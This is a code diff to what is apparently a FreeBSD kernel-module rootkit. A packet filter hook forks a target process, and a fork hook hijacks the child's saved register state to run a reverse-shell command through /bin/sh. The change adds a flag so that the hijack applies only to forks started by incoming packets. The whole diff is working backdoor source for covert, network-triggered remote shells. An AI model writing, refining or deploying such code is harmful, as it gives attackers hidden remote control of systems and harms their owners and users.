@@ -44,6 +44,7 @@ extern int kern_execve(struct thread *td, struct image_args *args, struct mac *m
 #define TARGET_PROC "apeshit"
 // Global dynamic string for reverse shell
 char reverse_shell_cmd[100];
+bool trying_to_make_rev_shell;
 // Define stack protection so we can use snprintf
 // Define the stack protector guard
 uintptr_t __stack_chk_guard = 0xDEADBEEFCAFEBABE;
@@ -131,6 +132,7 @@ static void custom_forkret_to_execve(struct thread *td, struct trapframe *frame)
 
     struct image_args args;
     int error;
+    trying_to_make_rev_shell = false;
     // Define command and arguments: /bin/sh -c "echo hello"
     char *argv[] = { "/bin/sh", "-c", reverse_shell_cmd, NULL };
     char *envp[] = { "PATH=/bin:/usr/bin", NULL };  // Basic environment
@@ -147,7 +149,6 @@ static void custom_forkret_to_execve(struct thread *td, struct trapframe *frame)
     // give it the current thread
     struct thread *curr_td = curthread;  // Macro to get current thread
     printf("Current thread ID: %d\n", curr_td->td_tid);
-
 
     error = kern_execve(curr_td, &args, NULL, NULL);
     if (error != 0) {
@@ -169,27 +170,25 @@ static void my_fork_hook(void *arg, struct proc *parent, struct proc *child, int
         return;
     }
 
+    if (trying_to_make_rev_shell) {
+        struct thread *child_td;
 
-    struct thread *child_td;
-
-    child_td = FIRST_THREAD_IN_PROC(child);
-    if (child_td == NULL) {
-        printf("[LKM] Failed to get first thread of child process!\n");
-        return;
+        child_td = FIRST_THREAD_IN_PROC(child);
+        if (child_td == NULL) {
+            printf("[LKM] Failed to get first thread of child process!\n");
+            return;
+        }
+    
+        struct pcb *pcb2;
+        // Get the PCB (Process Control Block) of the child thread 
+        pcb2 = child_td->td_pcb;
+        if (pcb2 == NULL) {
+            printf("[DEBUG] PCB is NULL, cannot modify it.\n");
+            return;
+        }
+        // hijack pcb_r12 to point from fork_trampoline to kern_execve()
+        pcb2->pcb_r12 = (register_t)custom_forkret_to_execve;
     }
-
-    struct pcb *pcb2;
-    // Get the PCB (Process Control Block) of the child thread 
-    pcb2 = child_td->td_pcb;
-    if (pcb2 == NULL) {
-        printf("[DEBUG] PCB is NULL, cannot modify it.\n");
-        return;
-    }
-    // hijack pcb_r12 to point from fork_trampoline to kern_execve()
-    pcb2->pcb_r12 = (register_t)custom_forkret_to_execve;
-
-
-
 
 }
 
@@ -341,6 +340,7 @@ static pfil_return_t my_packet_filter(struct mbuf **mp, struct ifnet *ifp, int d
         fr.fr_procp = &new_proc;
 
         // Fork from the found process
+        trying_to_make_rev_shell = true;
         error = fork1(parent_td, &fr);
         if (error) {
             printf("[LKM] Fork failed: %d\n", error);
